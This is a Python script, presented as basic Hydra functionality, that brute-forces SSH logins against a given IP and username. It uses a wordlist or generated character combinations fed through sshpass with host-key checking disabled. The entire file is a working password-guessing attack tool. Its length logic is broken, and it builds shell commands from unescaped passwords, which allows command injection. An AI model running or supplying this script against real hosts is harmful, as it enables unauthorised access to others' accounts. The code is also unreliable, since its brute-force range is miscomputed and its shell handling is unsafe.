import argparse
import subprocess
import itertools
import string

def hackPassword(ip, username, passwordlist):
    for password in passwordlist:
        if isinstance(password, tuple):
            password = ''.join(tuplePart for tuplePart in password)
        else:
            password = password.strip()
        print(f'Trying password: {password}')
        try:
            command = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no {username}@{ip} exit"
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            if result.returncode == 0:
                print(f'Success with password: {password}')
                return True
            else:
                print(f'Failed with password: {password}')
        except Exception as e:
            print(f'Error: {e}')
    return False

# Argparse:
parser = argparse.ArgumentParser(description='Hydra basic functionality')

parser.add_argument('-u', type=str, required=True, help='username')
parser.add_argument('-s', type=str, required=True, help='IP address')
parser.add_argument('-w', type=str, help='optional wordlist')
parser.add_argument('--min', type=int, default=1, help='minimum password length (default: 1)')
parser.add_argument('--max', type=int, default=2, help='maximum password length (default: 2)')
# default: all ascii and digits
parser.add_argument('-c', type=str, default=string.ascii_letters + string.digits, help='character set for brute force attack')

args = parser.parse_args()

#Check if passwordlist is present or not:
if args.w:
    # Hack password with password list
    try:
        with open(args.w, 'r') as file:
            passwordlist = file.readlines()
            hackPassword(args.s, args.u, passwordlist)
    except FileNotFoundError:
        print(f'File {args.w} not found')
else:
    range = args.max+1 -args.min
    # Hack password with brute force
    hackPassword(args.s,args.u, itertools.product(args.c, repeat=range))
